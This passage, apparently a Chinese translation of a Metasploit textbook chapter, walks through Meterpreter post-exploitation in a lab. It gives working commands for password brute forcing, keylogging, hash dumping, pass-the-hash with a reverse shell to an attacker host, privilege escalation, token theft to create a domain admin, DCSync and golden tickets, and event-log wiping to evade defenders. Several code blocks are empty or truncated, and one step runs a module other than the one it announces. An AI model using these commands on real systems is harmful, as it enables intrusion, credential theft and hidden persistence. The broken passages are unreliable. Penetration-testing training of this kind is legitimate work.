# METERPRETER

在本章中，我们将更深入地探讨 Meterpreter，并讨论它如何显著提升你的后渗透体验。Meterpreter 是一种植入程序，使我们能够利用 Metasploit 的功能，通过隐藏痕迹、纯内存驻留、转储哈希、提升权限、跳转攻击等方式进一步危害目标。

我们将利用 Metasploit 中的常规攻击方法来攻击一台 Windows 机器。一旦我们成功入侵系统，我们将使用 Meterpreter 载荷执行额外的攻击。

## 攻击 Windows 虚拟机

在我们深入探讨 Meterpreter 的具体细节之前，我们首先需要攻陷一个系统并获得一个 Meterpreter shell。在这里，我们将使用附录 A 中配置的 Windows 虚拟机。

## 暴力破解 MySQL 服务器认证

针对 MySQL 服务器时，我们可以利用 Metasploit 的 `mysql_login` 模块尝试通过暴力破解猜测服务器的用户名和密码。使用此模块，让我们尝试找到一个有效账户：

```bash
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > set PASS_FILE /usr/share/wordlists/fasttrack.txt
PASS_FILE => /usr/share/wordlist/fasttrack.txt
msf auxiliary(mysql_login) > set RHOSTS 192.168.1.102
RHOSTS => 192.168.1.102
msf auxiliary(mysql_login) > set THREADS 10
THREADS => 10
msf auxiliary(mysql_login) > set verbose false
verbose => false
msf auxiliary(mysql_login) > exploit

[+] 192.168.1.102:3306 - 192.168.1.102:3306 - Success: 'root:'
[+] 192.168.1.102:3306 - Scanned 1 of 1 hosts (100% complete)
[+] Auxiliary module execution completed
```

我们选择了 `mysql_login` 模块，并将其指向 Fast-Track 提供的默认密码字典。Metasploit 将把字典中的凭据提交给 MySQL 服务器，尝试登录。发起攻击后，我们成功猜出了 root 密码。结果以 `username:password` 的格式显示。在这种情况下，数据库管理员犯了一个巨大的错误：他们将密码留空，意味着任何人都可以登录。

Fast-Track 由本书作者之一创建，是一种利用多种攻击、漏洞利用和 Metasploit 框架传递载荷的工具。Fast-Track 的功能之一是能够使用暴力破解自动攻击 MySQL。

我们在此使用的 Fast-Track 字典包含的密码不多。Kali Linux 中最大的密码字典位于 `/usr/share/wordlists/rockyou.txt.gz`。要使用它，你需要先解压缩该文件。

## 上传用户定义函数

现在我们已经访问了 MySQL 服务器，接下来该做什么？MySQL 允许用户上传实现用户定义函数的库。例如，`lib_mysqldf_sys_32.dll` 库实现了 `sys_exec` 函数，这是系统调用 `syscall` 的一个封装，允许用户程序调用内核功能。你也可以使用 `sys_exec` 函数运行 shell 命令。我们将使用 `sys_exec` 函数在机器上下载并执行一个反向 shell。

## 捕获按键

我们还将开始在远程系统上进行按键记录（记录键盘输入）。但首先，我们需要迁移到 explorer 进程中，该进程负责显示用户在屏幕上看到的内容并读取用户输入。迁移是将载荷代码复制到另一个进程虚拟内存中的行为。一旦载荷被复制，它将作为目标进程中的一个新线程执行。对于好奇用于实现进程迁移的 Windows API 调用的读者，请阅读 Jorge Lajara 的《Meterpreter 中的进程迁移》（https://lajara.gitlab.io/process-migration）。

使用以下命令列出目标系统上正在运行的进程：

```bash

============

meterpreter > migrate 4748
[*] Migrating to 4748...
[*] Migration completed successfully.
meterpreter > run post/windows/capture/keylog_recorder
[*] Executing module against METASPLOITABLE3
[*] Starting the keystroke sniffer...

[*] Recording keystrokes...

kali@kali:~$ sudo cat /home/kali/.msf6/loot/20110324171334_default_192.168.1.102_host.windows.key_179703.txt

```

我们发出 `migrate` 命令将会话移动到 explorer.exe 进程空间。移动完成后，我们启动 `keylog_recorder` 模块，稍后使用 `CTRL-C` 停止它。最后，在另一个终端窗口中，我们转储按键记录器的内容以查看捕获的内容。看起来我们已经捕获了管理员密码！

运行 `migrate` 命令还有几个额外的优点。当你迁移到一个进程时，你的 Meterpreter 载荷被隐藏在该进程内部。因此，如果管理员列出目标机器上的进程，Meterpreter 会话不会出现在列表中。`migrate` 命令将载荷写入目标进程的虚拟内存，从而使载荷和目标进程共享内存中的同一位置。

你可以通过搜索 MITRE 的在线数据库（https://attack.mitre.org）中的进程注入或进程挖空，或者观看 Amit Klein 和 Itzik Kotler 的 Black Hat 演讲《进程注入技术——一网打尽》，来了解更多关于这种方法的信息。

在此示例中，我们使用了一个后渗透模块来捕获按键。要查看所有后渗透模块的列表，请输入 `run post/` 然后按 TAB 键。

## 提取密码哈希

在前面的示例中，我们通过记录用户输入的内容来抓取密码。我们也可以使用 Meterpreter 在不使用键盘记录器的情况下获取本地文件系统上的用户名和密码哈希。在此攻击中，我们将利用 Meterpreter 中的 `smart_hashdump` 后渗透模块从系统中提取用户名和密码哈希。

Microsoft 通常在 LAN Manager（LM）、NT LAN Manager（NTLM）和 NT LAN Manager v2（NTLMv2）协议中使用哈希。这些协议的安全性并不相同。对于 LM，当用户首次输入密码或更改密码时，密码会被分配一个哈希值。根据哈希值的长度，密码可以被分割成七个字符的哈希。例如，如果密码是 `password123456`，哈希值可能会存储为 `password` 和 `d123456`。因此，攻击者只需要破解一个七个字符的密码，这比破解一个 14 个字符的密码计算成本要低得多。相比之下，NTLM 协议更安全；无论密码大小如何，它都会存储为单个哈希值。

在你的 Windows 目标机器上，将密码更改为一些复杂的密码，例如 `thisisacrazylongpassword&&!!@@##`。该密码长度超过了 LM 支持的最大长度，因此它应该会自动转换为基于 NTLM 的哈希值。即使使用彩虹表或超强破解机，破解这样的密码也需要相当长的时间（尽管语言模型技术开始显示出一些有希望的结果）。

现在返回到你在攻击机上的 Meterpreter 会话，输入 `use priv` 命令，该命令加载 Meterpreter 的权限扩展。此扩展实现了多种功能，包括转储包含用户名和密码的安全账户管理器（SAM）数据库。然后，执行 `smart_hashdump` 命令，该命令从系统中检索所有用户名和密码哈希：

```bash

[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/kali/.msf6/loot/20220531182406_default_192.168.1.102_windows.hashes_574996.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY dab2d243bc1f36188d7b7a9a62c0a50c...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
```

## 哈希传递

在前面的示例中，我们遇到了一个小问题：我们可以使用 `smart_hashdump` 攻击来检索管理员的用户名和密码哈希，但我们无法在合理的时间范围内破解密码。如果我们不知道密码，我们如何登录到其他机器并可能利用此账户危害更多系统？

我们可以使用哈希传递技术，该技术只需要密码哈希，而不需要密码本身。该技术利用了 NTLM 协议设计中的一个漏洞，该协议接受密码哈希而不验证发送者是否知道密码。这意味着任何拥有用户密码哈希的人都可以冒充该用户。

Metasploit 的 `windows/smb/psexec` 模块使这成为可能：

```bash
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 192.168.1.100
LHOST => 192.168.1.100
msf exploit(psexec) > set LPORT 443
LPORT => 443
msf exploit(psexec) > set RHOST 192.168.1.102
RHOST => 192.168.1.102
msf exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
SMBPass => aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
msf exploit(psexec) > exploit

[*] Started reverse TCP handler on 192.168.1.100:443
```

## 权限提升

现在我们已获得对系统的访问权限，我们可以尝试创建一个权限有限的普通用户账户。创建这样一个用户账户将帮助你学习如何提升权限，以绕过阻止你执行需要管理员级别权限命令的限制。

输入以下命令在 Windows 机器上创建一个新用户 `bob`：

```bash
meterpreter > shell
C:\> net user bob password123 /add
```

`shell` 命令在目标机器上创建一个新的 shell 进程。你随后输入的任何命令都将像在目标的终端上执行一样。输入以下命令关闭 shell：

```bash
C:\Documents and Settings\Administrator> exit
```

现在我们已经创建了一个新用户，让我们使用 Metasploit 通过 SSH 登录并上传一个 Meterpreter 载荷：

```bash
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) > exploit

[*] 192.168.1.102:22 - Starting bruteforce
[+] 192.168.1.102:22 - Success: 'bob:password123' 'Microsoft Windows Server'
[*] SSH session 5 opened (192.168.1.100:32781 -> 192.168.1.102:22)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

模块完成后，Metasploit 可以看到活动会话。只需输入：

```bash
msf auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  --  ----  ----   -----------                     ----------
  1         shell  windows SSH kali @ 192.168.1.100:43609 -> 192.168.1.102:22
```

该模块建立 SSH 会话，但我们希望将其升级为 Meterpreter 会话。一旦系统被入侵，使用 `sessions -u` 命令将你的 shell 升级为 Meterpreter 会话。如果你使用命令 shell 载荷作为初始 stager，然后发现这个新入侵的系统将成为进一步攻击网络的完美跳板，这将非常有用。以下命令升级 ID 为 1 的会话：

```bash
msf auxiliary(scanner/ssh/ssh_login) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]
[*] Upgrading session ID: 1
meterpreter >
```

在攻击机上，我们在用户账户 `bob` 下创建了一个新的 Meterpreter 会话。

接下来，我们进入 Meterpreter shell 并输入 `net user bob` 查看用户 `bob` 是 Users 组的成员，而不是管理员，并且权限有限：

```bash
meterpreter > shell

C:\> ^Z
```

这意味着我们攻击此设备的足迹有限，并且我们无法执行某些攻击，例如转储 SAM 数据库以提取用户名和密码（幸运的是，Meterpreter 为我们提供了解决方案，你很快就会看到）。稍后我们将返回到我们的 meterpreter 会话。按 `CTRL-Z` 离开（后台）Meterpreter 会话，以便我们可以稍后重新打开它。

## 注

另一个 Meterpreter 技巧：当你在 Meterpreter 会话中时，输入 `background` 可以跳回 MSFconsole 并让会话保持后台运行。然后输入 `sessions -l` 和 `sessions -i sessionid` 返回你的 Meterpreter 控制台。

现在让我们获取管理员权限。如下所示，我们输入 `use priv` 加载 priv 扩展，这使我们能够访问权限提升功能。接下来，我们输入 `getsystem` 将我们的权限从本地用户提升到管理员。但这并不适用于所有系统；我们将在本节后面讨论替代方案。

一旦我们提升了权限，我们运行 `getuid` 命令确认我们拥有管理员访问权限。返回的服务器用户名是 `NT AUTHORITY\SYSTEM`，这告诉我们已成功获得管理员访问权限：

```bash
meterpreter > use priv
Loading extension priv...success.
meterpreter > getsystem
...got system (via technique 4).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

要切换回最初获得 Meterpreter shell 时的先前用户账户，我们将使用 `rev2self` 命令。

有时 `getsystem` 命令会失败。也就是说，目标机器不易受 `getsystem` 使用的任何漏洞利用的攻击。当这种情况发生时，搜索替代的权限提升模块。`local_exploit_suggester` 模块是发现本地权限提升漏洞利用的绝佳工具。输入以下命令运行该模块：

```bash
meterpreter > background
msf > use exploit/windows/local/cve_2019_1458_wizardopium
msf exploit(windows/local/cve_2019_1458_wizardopium) > set session 2
session => 2
msf exploit(windows/local/cve_2019_1458_wizardopium) > exploit
```

漏洞利用完成后，它应该返回一个具有本地 Windows 机器最高权限（`NT AUTHORITY\SYSTEM`）的 Meterpreter 会话。`getuid` 命令检索有关当前用户的信息：

## 横向移动技术

本章剩余部分假设你在一个网络上，该网络有一个管理名为 `SNEAKS.IN` 的域的域控制器。在附录 A 中，我们包含了可以用来扩展你的实验室网络以包含域控制器的说明。设置域控制器是学习 Windows 域管理复杂性的好方法。

## 令牌模拟

当用户登录 Windows 系统时，他们会收到一个安全令牌。他们可以使用此令牌访问其他系统和服务而无需重新认证，因为令牌包含用户的身份和权限。在令牌模拟中，攻击者获取目标机器上的 Kerberos 令牌，并使用它代替认证来冒充最初创建该令牌的用户身份。令牌模拟对渗透测试非常有益，并且是 Meterpreter 最强大的功能之一。

考虑以下场景：你正在你的组织中进行渗透测试，成功入侵了系统并建立了一个 Meterpreter 会话。一个域管理员账户在过去 13 小时内登录过。当此账户登录时，Kerberos 令牌作为单点登录过程的一部分传递到服务器，并在一定时间内保持有效。

如果你能获得这个有效且活跃的 Kerberos 令牌，你就可以成功扮演域管理员的角色，而无需管理员密码。然后，你可以去攻击域控制器。这可能是获得系统访问权限的最简单方法之一，也是 Meterpreter 如此有用的另一个例子。

在我们的示例域中，我们将使用 Meterpreter 函数 `ps` 列出网络上运行的应用程序并显示它们运行所在的账户。在输出中，你可以看到域名 `SNEAKS.IN` 和用户账户 `ihazdomainadmin`：

```bash
meterpreter > ps

Process list
============
 PID   Name                  Arch  Session  User
 ---   ----                  ----  -------  ----
 0     [System Process]
 4     System                x86   0        NT AUTHORITY\SYSTEM
 380   cmd.exe               x86   0        SNEAKS.IN\ihazdomainadmin
```

如下所示，我们利用 `steal_token` 和一个进程 ID（本例中为 380）来窃取该用户的令牌，然后扮演域管理员的角色：

```bash
meterpreter > steal_token 380
Stolen token with username: SNEAKS.IN\ihazdomainadmin
meterpreter > getuid
Server username: SNEAKS.IN\ihazdomainadmin
```

我们已经成功冒充了域管理员账户，Meterpreter 现在正在该用户的上下文中运行。

有时 `ps` 可能不会列出任何作为域管理员运行的进程。在这种情况下，我们可以利用 `incognito` 列出系统上可用的令牌。在执行渗透测试时，检查 `ps` 和 `incognito` 的输出，因为结果可能不同。

我们使用 `use incognito` 加载 incognito，然后使用 `list_tokens -u` 列出令牌。查看令牌列表，我们看到 `SNEAKS.IN\ihazdomainadmin` 用户账户：

```bash
meterpreter > use incognito
Loading extension incognito...success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens
will be available
Call rev2self if primary process token is SYSTE
M
Delegation Tokens Available
========================================
SNEAKS.IN\ihazdomainadmin
IHAZSECURITY\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
```

现在我们可以伪装成其他人了。如下方清单所示，我们成功模拟了 `ihazdomainadmin` 令牌，并添加了一个用户账户，随后赋予该账户域管理员权限。（在输入 `域名\用户名` 时，请务必使用两个反斜杠 `\\`。）域控制器的 IP 地址是 192.168.33.50。

```bash
meterpreter > impersonate_token SNEAKS.IN\\ihazdomainadmin
[+] Delegation token available
[+] Successfully impersonated user SNEAKS.IN\ihazdomainadmin
meterpreter > add_user omgcompromised p@55w0rd! -h 192.168.33.50
[*] Attempting to add user omgcompromised to host 192.168.33.50
[+] Successfully added user
meterpreter > add_group_user "Domain Admins" omgcompromised -h 192.168.33.50
[*] Attempting to add user omgcompromised to group Domain Admins on domain controller 192.168.33.50
[+] Successfully added user to group
```

在执行 `add_user` 和 `add_group_user` 命令时，请务必指定 `-h` 标志，该标志告诉 incognito 在哪里添加域管理员账户。在本例中，这将是域控制器的 IP 地址。

这种攻击的影响是毁灭性的。本质上，域管理员登录过的任何系统上的 Kerberos 令牌都可以被窃取，并用于访问整个域。这意味着你网络中的每一台服务器都可能成为你最薄弱的环节！

## DCSync 和黄金票据攻击

DCSync 攻击是从网络上的域控制器提取凭据的另一种方法。在 DCSync 攻击中，攻击者假装自己是域控制器，并请求网络上的另一台机器通过发送包含用户和密码哈希的数据库副本来与其同步。

该数据库中最重要的哈希之一是 Kerberos 票据授予票（krbtgt）。这是用于签名域控制器生成的所有票据的密码哈希。如果攻击者能够窃取此密码哈希，他们可以生成一个已签名的票据，授予他们访问网络上所有机器的权限，这通常被称为黄金票据。拥有黄金票据的攻击者可以在不使用任何漏洞利用的情况下获得对域上系统的访问权限。

DCSync 攻击只能从属于域管理员的账户执行。通过启动 shell 并运行以下 `whoami` 命令，确认你已获得一个属于域管理员组成员的账户：

```bash
meterpreter > shell
Process 4796 created
Channel 3 created.
Microsoft Windows
Copyright (c) Microsoft Corporation. All rights reserved.
c:\wamp\bin\mysql\mysql\data> whoami /groups
whoami /groups
GROUP INFORMATION
-----------------
Group Name Type SID
====================================== ================ ====
========
BUILTIN\Administrators Alias S-1-5-32-544
Everyone Well-known group S-1-1-0
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11
Mandatory Label\System Mandatory Level Label S-1-16-16384
SNEAKS.IN\Domain Admins Group S-1-5-21-57851684...
c:\wamp\bin\mysql\mysql\data> exit
exit
meterpreter >
```

确认我们拥有正确的权限后，我们将使用 `kiwi` 模块的 `dcsync_ntlm` 命令。

```bash
meterpreter > load kiwi 
meterpreter > dcsync_ntlm krbtgt 
[+] Account : krbtgt 
[+] NTLM Hash : af03044093fd4cffa75a7445d7e29689 
[+] LM Hash : 728b8c8e407db950ade9ff10103574fe 
[+] SID : S-1-5-21-5785168455-2458762945-4813486209-51 2 
[+] RID : 512
```

krbtgt 是标记为 NTLM Hash 的哈希值。一旦我们获取了它，就可以使用 kiwi 的 `golden_ticket_create` 命令来生成黄金票据。下面展示了该命令的通用格式：

```bash
meterpreter > golden_ticket_create -d <Domain> -u <Username>
-s <SID> -k <KRGTBT_HASH> -t <Outfile.tck>
```

`-d` 标志指定域。`-u` 标志指定我们要与该票据关联的用户；此处，我们将该票据与用户 `admin.consultant` 关联。`-s` 标志指定安全标识符（SID）；我们将使用从 DCSync 攻击中获得的 SID。`-k` 标志指定 `krbtgt` 的 NTLM 哈希。最后，`-t` 标志表示输出目录，我们创建的黄金票据将存储在该目录中。

```bash
meterpreter > golden_ticket_create -d SNEAKS.IN -u admin.consultant -s S-1-5-21-5785168455-2458762945-4813486209-512 -k af03044093fd4cffa75a7445d7e29689 -t /home/kali/goldenTicket.tck
[+] Golden Kerberos ticket written to /home/kali/goldenTicket.tck
```

现在我们创建了黄金票据，可以通过运行 `kerberos_ticket_use` 命令后跟票据路径将其与当前会话关联：

```bash
meterpreter > kerberos_ticket_use /home/kali/goldenTicket.tck
```

你可以使用 `kerberos_ticket_list` 命令查看所有票据的列表：

```bash
meterpreter > kerberos_ticket_list
[+] Kerberos tickets found in the current session.
[00000000] - 0x00000017 - rc4_hmac_nt
   Server Name   : krbtgt/SNEAKS.IN @ SNEAKS.IN
   Client Name   : admin.consultant @ SNEAKS.IN
   Flags 40e00000 : pre_authent ; initial ; renewable ; forwardable ;
```

现在我们可以访问网络上的所有资源和共享驱动器。

## 建立持久化

持久化技术允许你即使系统管理员修补了漏洞或重启了系统，也能访问系统。作为案例研究，我们将使用一个 Metasploit 模块在 Linux 系统上建立持久化。

然后，我们将讨论如何在 Windows 系统上搜索持久化模块。

## 警告

如果你使用持久化模块，完成后务必删除它创建的人工制品。如果你忘记这样做，任何攻击者都可能无需认证即可访问系统！

```bash
msf post(linux/manage/sshkey_persistence) > options
```

## 使用 Railgun 操作 Windows API

你可以通过名为 Railgun 的 Metasploit 附加组件直接与 Windows 本机 API 交互，该组件由 Patrick HVE 编写。通过将 Railgun 添加到 Metasploit 框架，你可以通过 Meterpreter 本机调用 Windows API。例如，在下面的示例中，我们将进入通过 Meterpreter 可用的交互式 Ruby shell（irb）。irb shell 允许我们使用 Ruby 语法与 Meterpreter 交互。

首先，我们将迁移到 Explorer 进程中，以便我们可以使用 Windows 用户界面：

```bash
meterpreter > ps explorer
Filtering on 'explorer'
Process List
============
PID PPID Name Arch Session User
Path
--- ---- ---- ---- ------- ----
----
4184 4944 explorer.exe x64 1 METASPLOITABLE3\bob
C:\Windows\Ex...
meterpreter > migrate 4184
[*] Migrating from 3976 to 4184...
[*] Migration completed successfully.
```

成功迁移后，我们将使用 Railgun 库调用 Windows MessageBox 函数并创建一个简单的“hello world”弹出框：

```bash
meterpreter > irb
[*] Starting IRB shell
[*] You are in the "client" (session) object
>> railgun.user32.MessageBoxA(0,"hello","world","MB_OK")
```

在目标 Windows 机器上，你应该会看到一个弹出框，标题栏显示“world”，消息框中显示“hello”。

你还可以使用 irb 清除日志、掩盖痕迹，并使蓝队更难检测到你：

```ruby
>> logs = sys.eventlog.open('system')
>> logs.clear
```

清除日志文件的另一种方法是在你的解释器会话中运行 `clearev` 命令：

```bash
meterpreter > clearev
[*] Wiping 33640 records from Application...
[*] Wiping 136 records from System...
[*] Wiping 29050 records from Security...
```

## 跳转到其他系统

有时机器无法直接通过互联网访问；例如，如果它们位于防火墙后面。如果攻击者入侵了防火墙或其后面的机器，他们可以利用该被入侵的机器攻击内部网络上的其他机器。这种技术称为 pivoting，攻击者通过被入侵的机器将数据包路由到其他机器来在网络中移动。Metasploit 有关于使用 Meterpreter 通过网络进行 pivoting 的优秀文档：https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html。
